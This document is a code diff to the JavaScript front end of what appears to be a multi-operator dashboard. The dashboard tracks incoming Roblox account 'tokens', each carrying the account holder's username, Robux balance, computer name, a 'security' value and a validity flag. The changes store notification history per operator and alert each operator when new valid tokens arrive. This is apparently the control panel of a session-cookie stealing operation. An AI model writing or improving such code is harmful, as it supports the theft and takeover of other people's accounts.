@@ -159,21 +159,41 @@ function formatAccountLoginStatus(lastLoginTs) {
   }
 }
 
+function getUserNotifKey() {
+  const u = (getUser() || 'default').toLowerCase();
+  return 'ft_notifications_history_' + u;
+}
+
+function getUserNotifTimeKey() {
+  const u = (getUser() || 'default').toLowerCase();
+  return 'ft_last_read_notif_time_' + u;
+}
+
+function getUserChatTimeKey() {
+  const u = (getUser() || 'default').toLowerCase();
+  return 'ft_last_read_chat_time_' + u;
+}
+
 // ── Сохранение уведомления в локальную историю ───────────────────────────────
 function saveNotificationToHistory(info) {
+  if (!info) return;
   try {
-    const history = JSON.parse(localStorage.getItem('ft_notifications_history') || '[]');
+    const key = getUserNotifKey();
+    const raw = localStorage.getItem(key);
+    let history = raw ? JSON.parse(raw) : [];
+    if (!Array.isArray(history)) history = [];
+
     const statusInfo = formatAccountLoginStatus(info.lastLogin);
-    
+
     const record = {
-      id: info.id || ('notif_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6)),
+      id: 'notif_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
       username: info.username || 'Roblox User',
       userId: info.userId || null,
       robux: Number(info.robux) || 0,
-      computer: info.computer || 'Unknown PC',
+      computer: info.computer || '—',
       security: info.security || null,
       file: info.file || null,
-      lastLogin: info.lastLogin || null,
+      lastLogin: info.lastLogin,
       isNew: statusInfo.isNew,
       statusText: statusInfo.text,
       receivedAt: Date.now()
@@ -187,15 +207,15 @@ function saveNotificationToHistory(info) {
     if (!isDuplicate) {
       history.unshift(record);
       if (history.length > 200) history.pop();
-      localStorage.setItem('ft_notifications_history', JSON.stringify(history));
+      localStorage.setItem(key, JSON.stringify(history));
     }
   } catch (e) {}
 }
 
 function getUnreadNotificationsCount() {
   try {
-    const history = JSON.parse(localStorage.getItem('ft_notifications_history') || '[]');
-    const lastRead = parseInt(localStorage.getItem('ft_last_read_notif_time') || '0');
+    const history = JSON.parse(localStorage.getItem(getUserNotifKey()) || '[]');
+    const lastRead = parseInt(localStorage.getItem(getUserNotifTimeKey()) || '0');
     return history.filter(n => (n.receivedAt || 0) > lastRead).length;
   } catch (e) {
     return 0;
@@ -208,7 +228,7 @@ function getUnreadChatCount() {
     if (!raw) return 0;
     const list = JSON.parse(raw);
     if (!Array.isArray(list)) return 0;
-    const lastRead = parseInt(localStorage.getItem('ft_last_read_chat_time') || '0');
+    const lastRead = parseInt(localStorage.getItem(getUserChatTimeKey()) || '0');
     const myUser = getUser();
     return list.filter(m => (m.operator !== myUser) && (new Date(m.createdAt || 0).getTime() > lastRead)).length;
   } catch (e) {
@@ -226,7 +246,7 @@ async function checkUnreadChatBackground() {
     if (!Array.isArray(list)) return;
 
     localStorage.setItem('ft_cached_chat_messages', JSON.stringify(list));
-    const lastRead = parseInt(localStorage.getItem('ft_last_read_chat_time') || '0');
+    const lastRead = parseInt(localStorage.getItem(getUserChatTimeKey()) || '0');
     const myUser = getUser();
     const unread = list.filter(m => (m.operator !== myUser) && (new Date(m.createdAt || 0).getTime() > lastRead)).length;
 
@@ -325,31 +345,37 @@ function showTokenNotification(info) {
   }, 7000);
 }
 
-// ── Фоновый слушатель новых токенов ──────────────────────────────────────────
-let lastKnownTokenIds = new Set();
-let isFirstTokenLoad = true;
+// ── Фоновый слушатель новых токенов (изолирован по оператору) ────────────────
+let lastKnownTokensByOperator = {};
 
 async function checkNewTokensBackground() {
-  if (!getToken()) return;
+  const user = (getUser() || '').toLowerCase();
+  if (!user || !getToken()) return;
+
+  if (!lastKnownTokensByOperator[user]) {
+    lastKnownTokensByOperator[user] = { ids: new Set(), initialLoaded: false };
+  }
+  const opState = lastKnownTokensByOperator[user];
+
   try {
     const resp = await apiFetch('/tokens-data');
     if (!resp.ok) return;
     const tokens = await resp.json();
     if (!Array.isArray(tokens)) return;
 
-    if (isFirstTokenLoad) {
+    if (!opState.initialLoaded) {
       tokens.forEach(t => {
         const id = t.file || t.userId || t.security;
-        if (id) lastKnownTokenIds.add(id);
+        if (id) opState.ids.add(id);
       });
-      isFirstTokenLoad = false;
+      opState.initialLoaded = true;
       return;
     }
 
     tokens.forEach(t => {
       const id = t.file || t.userId || t.security;
-      if (id && !lastKnownTokenIds.has(id)) {
-        lastKnownTokenIds.add(id);
+      if (id && !opState.ids.has(id)) {
+        opState.ids.add(id);
         if (t.valid) {
           const lastLogin = t.lastLogin 
             || (t.file ? localStorage.getItem('login_' + t.file) : null)
@@ -425,7 +451,7 @@ function renderHeader(activePage) {
   const name = operatorDisplayName(user);
 
   if (activePage === 'notifications') {
-    localStorage.setItem('ft_last_read_notif_time', String(Date.now()));
+    localStorage.setItem(getUserNotifTimeKey(), String(Date.now()));
   }
   const unread = activePage === 'notifications' ? 0 : getUnreadNotificationsCount();
   const notifBadgeHtml = unread > 0 
